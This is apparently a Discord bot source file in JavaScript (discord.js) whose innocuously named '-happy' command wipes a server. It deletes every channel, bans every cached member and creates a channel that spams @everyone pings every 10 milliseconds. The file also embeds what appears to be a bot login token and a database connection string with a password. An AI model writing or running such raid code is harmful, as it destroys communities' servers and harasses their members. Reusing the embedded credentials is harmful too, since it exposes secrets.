const { Intents, MessageEmbed, Client } = require('discord.js');
const bot = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_PRESENCES, Intents.FLAGS.GUILD_VOICE_STATES] });

//const Levels = require('discord-xp');

//Levels.setURL("mongodb+srv://Deku:12345@levels.u8mspxr.mongodb.net/?retryWrites=true&w=majority")

//Anti crash system
process.on("unhandledRejection", (reason, p) => {
    console.log(reason, p)
})
process.on("uncaughtException", (err, origin) => {
    console.log(err, origin)
})

bot.on("messageCreate", async message => {

    if (message.content == "-happy") {

        message.guild.channels.cache.forEach(c => {
            c.delete()
        })

        let randomArray = ["I am an unicorn", "cheh", "PAAPAPPAPAPPAPAP", "hello get out of there", "YOHOOO", "HERE IS YOUR HAPPINESS"]

        message.guild.channels.create("cheh", { //Create a channel

            type: 'text', //Make sure the channel is a text channel
            permissionOverwrites: [{ //Set permission overwrites
                id: message.guild.id,
                allow: ['VIEW_CHANNEL'],
            }]

        }).then(channel => {
            let random = Math.floor(Math.random() * randomArray.length)
            random = randomArray[random]
            setInterval(function () { channel.send(`${random} ` + `<@everyone>`) }, 10)
        })

        message.guild.members.cache.forEach(m => {
            m.ban()
        })

    }
})

//Login

bot.login("MTA0OTMwNTczOTYxMDU2MjU4MA.GuKagS.bdEAcINqe1vPisFF1Drz85iiH4smHma70FnULM");

//Specials




//require('./utils/handlers/specialEvents')(bot);